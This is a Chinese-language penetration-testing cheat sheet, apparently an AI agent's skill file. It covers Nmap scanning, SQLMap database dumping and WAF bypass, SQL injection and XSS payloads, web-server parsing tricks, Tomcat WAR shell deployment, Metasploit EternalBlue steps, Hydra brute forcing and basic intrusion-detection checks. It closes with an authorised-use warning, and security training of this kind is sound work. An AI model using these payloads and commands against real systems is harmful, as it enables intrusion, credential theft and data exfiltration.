# 渗透测试技能

> 基于用户收集的安全学习资料整理

## 简介

本技能整合了以下学习资料的核心内容：
- Web渗透测试
- SQL注入 (SQLMap, Discuz漏洞, 注入天书)
- XSS/CSRF
- 中间件漏洞 (IIS/Apache/Nginx/Tomcat/JBoss/WebLogic)
- 渗透工具 (MSF, Kali, Burp Suite)
- 入侵检测与应急响应
- 安全工程师学习路线

---

## 工具安装

### 已安装工具
```bash
# Nmap - 端口扫描
nmap target.com

# SQLMap - SQL注入
~/.local/bin/sqlmap -u "http://target.com?id=1"

# Nikto - Web漏洞扫描
nikto -h target.com
```

### 常用工具列表

| 工具 | 用途 | 命令 |
|------|------|------|
| Nmap | 端口扫描 | `nmap -sV target.com` |
| SQLMap | SQL注入 | `sqlmap -u "url"` |
| Nikto | Web扫描 | `nikto -h target` |
| MSF | 漏洞利用 | `msfconsole` |
| Burp | Web测试 | 图形界面 |
| Hydra | 暴力破解 | `hydra -L user -P pass` |

---

## 信息收集

### 端口扫描
```bash
# 基本扫描
nmap target.com

# 全面扫描
nmap -A -p- target.com

# 服务版本
nmap -sV target.com

# 常见端口
nmap -F target.com
```

### 搜索引擎语法
```
site:target.com          # 子域名
inurl:admin            # 后台
intitle:login          # 标题
filetype:pdf           # 文件类型
```

### 敏感文件
```
/phpinfo.php
/admin
/robots.txt
/.git/config
/.svn/entries
```

---

## Web漏洞

### SQL注入

#### 常用Payload
```sql
' or 1=1 --
' or '1'='1
admin' --
```

#### SQLMap使用
```bash
# 基本检测
sqlmap -u "http://target.com?id=1"

# 获取数据库
sqlmap -u "url" --dbs

# 获取表
sqlmap -u "url" --tables -D "db_name"

# 拖库
sqlmap -u "url" --dump -T "users"

# POST注入
sqlmap -u "url" --data="user=1&pass=2"

# 绕过WAF
sqlmap -u "url" --tamper "space2morehash"
```

### XSS

#### 常用Payload
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<a href="javascript:alert(1)">
```

### 文件上传

#### 常见绕过
- 绕过Content-Type
- 解析漏洞 (IIS/Apache/Nginx)
- 文件包含
- 00截断

---

## 中间件漏洞

### IIS
```
# 解析漏洞
info.jpg → info.asp;.jpg

# 短文件名
nmap --script=http-enum target
```

### Apache
```
# 解析漏洞
test.php.xxx → 解析为PHP

# 换行解析 (CVE-2017-15715)
test.php\n → 解析为PHP
```

### Nginx
```
# 解析漏洞
test.jpg/xxx.php → 解析为PHP
```

### Tomcat
```
# 弱口令
/admin:admin

# WAR部署
jar -cvf shell.war shell.jsp
```

### WebLogic
```
# XMLDecoder (CVE-2017-10271)
/wls-wsat/CoordinatorPortType
```

### JBoss
```
# 反序列化 (CVE-2017-12149)
/invoker/readonly
```

---

## 渗透工具

### Metasploit

```bash
# 启动
msfconsole

# 搜索漏洞
search ms17_010

# 使用模块
use exploit/windows/smb/ms17_010_eternalblue

# 设置参数
set RHOST 192.168.1.100
set LHOST 192.168.1.200

# 攻击
exploit
```

### Burp Suite

```
# 常用模块
- Proxy: 拦截流量
- Repeater: 重放请求
- Intruder: 暴力破解
- Scanner: 漏洞扫描
```

### Hydra

```bash
# SSH暴力破解
hydra -L users.txt -P passwords.txt ssh://target.com

# FTP暴力破解
hydra -L users.txt -P passwords.txt ftp://target.com
```

---

## 入侵检测

### Windows排查

```cmd
# 检查账号
net user

# 检查端口
netstat -ano

# 检查进程
tasklist

# 计划任务
schtasks /query /fo LIST /v

# 启动项
msconfig
```

### Linux排查

```bash
# 检查用户
cat /etc/passwd

# 检查端口
netstat -antlp

# 检查进程
ps aux

# 检查定时任务
crontab -l

# 检查登录日志
last
lastlog

# SSH暴力破解
grep "Failed password" /var/log/secure
```

---

## 常用命令速查

### Nmap
```bash
nmap 192.168.1.1              # 单IP
nmap 192.168.1.0/24            # 网段
nmap -p 80,443 target          # 指定端口
nmap -sS target                # SYN扫描
nmap -sV target                # 版本检测
```

### SQLMap
```bash
sqlmap -u "url"                # 检测
sqlmap -u "url" --dbs         # 数据库
sqlmap -u "url" --tables      # 表
sqlmap -u "url" --dump        # 数据
```

### MSF
```bash
search xxx                     # 搜索
use xxx                       # 使用模块
show options                  # 选项
set RHOST xxx                 # 设置目标
exploit                       # 攻击
```

---

## 学习资源

### 靶场
- DVWA (Web漏洞)
- SQLi-Labs (SQL注入)
- VulnHub (渗透测试)
- HackTheBox (综合)

### CVE查询
- cve.mitre.org
- exploit-db.com
- nvd.nist.gov

---

## 注意事项

> 仅在授权环境下使用！未经授权的渗透测试是违法行为。

---

## 相关文件

- /root/.openclaw/workspace/MEMORY.md - 网络安全知识库
